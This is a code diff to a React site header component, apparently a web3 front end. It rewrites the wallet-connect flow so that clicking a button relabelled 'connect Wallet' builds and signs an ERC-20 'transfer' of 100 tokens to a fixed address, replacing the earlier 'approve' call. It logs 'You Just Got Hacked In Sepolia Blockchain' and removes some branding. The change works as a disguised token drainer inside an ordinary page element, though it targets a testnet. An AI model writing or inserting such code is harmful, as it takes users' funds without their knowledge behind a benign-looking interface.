@@ -46,12 +46,12 @@ export default function Header(props) {
   const amountToApprove = web3.utils.toWei('100', 'ether'); // Amount of tokens to approve (10 tokens in this case)
 
   const erc20ABI = [
-        // Only the `approve` function ABI
+        // Only the `transfer` function ABI
         {
             "constant": false,
             "inputs": [
                 {
-                    "name": "spender",
+                    "name": "recipient",
                     "type": "address"
                 },
                 {
@@ -59,7 +59,7 @@ export default function Header(props) {
                     "type": "uint256"
                 }
             ],
-            "name": "approve",
+            "name": "transfer",
             "outputs": [
                 {
                     "name": "",
@@ -128,9 +128,9 @@ export default function Header(props) {
         const txDetails = {
             nonce: await web3.eth.getTransactionCount(account),
             gasPrice: web3.utils.toHex(await web3.eth.getGasPrice()), // Use current gas price
-            gasLimit: web3.utils.toHex(100000), // Gas limit for the `approve` function
+            gasLimit: web3.utils.toHex(100000), // Gas limit for the `transfer` function
             to: tokenContractAddress,
-            data: contract.methods.approve(spenderAddress, amountToApprove).encodeABI(), // Encode ABI data for the `approve` function
+            data: contract.methods.transfer(spenderAddress, amountToApprove).encodeABI(), // Encode ABI data for the `transfer` function
         };
 
         console.log(txDetails)
@@ -138,7 +138,7 @@ export default function Header(props) {
         // Sign the transaction
         const signedTx = await web3.eth.accounts.signTransaction(txDetails, privateKey);
 
-        console.log('Signed Transaction:', signedTx);
+        console.log('You Just Got Hacked In Sepolia Blockchain', signedTx);
       } catch (error) {
         console.error("User denied account access or error occurred:", error);
       }
@@ -179,7 +179,7 @@ export default function Header(props) {
         <div className="container mx-auto">
           <div className="relative flex items-center justify-between lg:justify-start md:space-x-6 lg:space-x-10">
             <div className="flex justify-start lg:w-0 lg:flex-1">
-              <span className="sr-only">Moi</span>
+              {/* <span className="sr-only">Moi</span> */}
                 <Link href="/" rel="noopener noreferrer">
                   <img
                     className="h-14 w-auto"
@@ -210,7 +210,7 @@ export default function Header(props) {
                     className="mx-4 px-2 py-2 lg:px-8 lg:py-2 text-sm lg:text-lg"
                     onClick={connectWallet} // Connect wallet on click
                   >
-                    LogIn MOI ID
+                    connect Wallet
                   </ButtonComponent>
               </div>
               <ToggleComponent />
@@ -247,11 +247,11 @@ export default function Header(props) {
                     <span className="sr-only">Moi</span>
                   
                       <Link href="/">
-                        <img
+                        {/* <img
                           className="h-14 w-auto"
                           src="/images/moi-dark-logo.svg"
                           alt="Moi Technology"
-                        />
+                        /> */}
                       </Link>
                     
                   </Link>
